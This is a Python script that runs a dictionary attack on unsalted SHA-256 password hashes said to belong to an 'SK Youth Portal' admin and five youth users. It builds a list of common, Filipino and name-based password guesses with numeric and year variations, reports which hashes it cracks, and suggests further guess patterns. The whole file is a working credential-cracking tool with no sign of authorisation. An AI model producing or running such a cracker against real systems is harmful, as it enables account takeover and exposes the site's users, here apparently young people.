import hashlib

user_hashes = {
    "Admin Officer (admin@sk.ph)": "240be518fabd2724ddb6f04eeb1da5967448d7e831c08c8fa822809f74c720a9",
    "Youth User 1 (youth1@example.com)": "8a630de72b9c76f0978978cf1be92917fd8240f4975d53befcceaf938fe29901",
    "Youth User 2 (youth2@example.com)": "b4a6a2633526e349cf88d8e56203c21e806092014b61335d043ba41d9f2bcc47",
    "Youth User 3 (youth3@example.com)": "7db3628dc1a91163a3a3e03efa415c3f8433320118327febe5494745bbda7ca2",
    "Youth User 4 (youth4@example.com)": "38fd748d0ed88078fc24e02ed13766041b43a1b094c326c097da983927b57ad8",
    "Youth User 5 (youth5@example.com)": "7a723d195dcd9f5f11613909d104df77a4fc4864d0853302d1a5f070b82bd0e2"
}

# Common passwords to test
common_passwords = [
    # Basic passwords
    "admin123", "admin", "password", "123456", "12345678", "1234", "12345",
    "qwerty", "password123", "youth123", "youth", "youth2024", "youth2023",
    
    # SK-related
    "sk123", "sk2024", "sk2023", "skadmin", "skyouth", "skpassword",
    
    # Year-based
    "2024", "2023", "2022", "2021", "2020",
    
    # Simple patterns
    "user123", "user1", "user2", "user3", "user4", "user5",
    "test123", "test", "demo", "demo123",
    
    # Number sequences
    "111111", "222222", "333333", "444444", "555555",
    "666666", "777777", "888888", "999999", "000000",
    
    # Common Filipino passwords
    "pilipinas", "philippines", "pinoy", "filipino",
    "mahal", "bayan", "bansa", "ako", "ikaw",
    
    # Name-based (likely for youth users)
    "juan", "maria", "pedro", "ana", "jose", "maria123",
    "delacruz", "santos", "reyes", "garcia", "dela cruz",
]

# Additional youth-specific patterns
youth_patterns = []
for i in range(1, 6):
    youth_patterns.extend([
        f"youth{i}", f"youth{i}123", f"youth{i}@", f"youth{i}@123",
        f"user{i}", f"user{i}123", f"youthuser{i}", f"youthuser{i}123",
        f"youth{i}@example", f"youth{i}@example.com",
    ])

# Add year combinations
for year in ["2024", "2023", "2022", "2021"]:
    for i in range(1, 6):
        youth_patterns.extend([
            f"youth{i}{year}", f"youth{i}_{year}", f"user{i}{year}",
        ])

# Combine all password lists
all_passwords = common_passwords + youth_patterns

print("🔑 Cracking Passwords for SK Youth Portal")
print("=" * 60)

found_count = 0
for user, stored_hash in user_hashes.items():
    print(f"\n🔍 Testing: {user}")
    print("-" * 40)
    
    found = False
    for password in all_passwords:
        test_hash = hashlib.sha256(password.encode()).hexdigest()
        if test_hash == stored_hash:
            print(f"✅ FOUND: {password}")
            found = True
            found_count += 1
            break
    
    if not found:
        print("❌ NOT FOUND in common passwords")
        print(f"   Hash: {stored_hash[:32]}...")

print(f"\n" + "=" * 60)
print(f"📊 Results: {found_count}/{len(user_hashes)} passwords found")

if found_count < len(user_hashes):
    print("\n💡 Try these additional patterns:")
    print("   1. youth[number][year] (e.g., youth22024)")
    print("   2. First names (e.g., juan, maria)")
    print("   3. Simple patterns (e.g., abc123, 123abc)")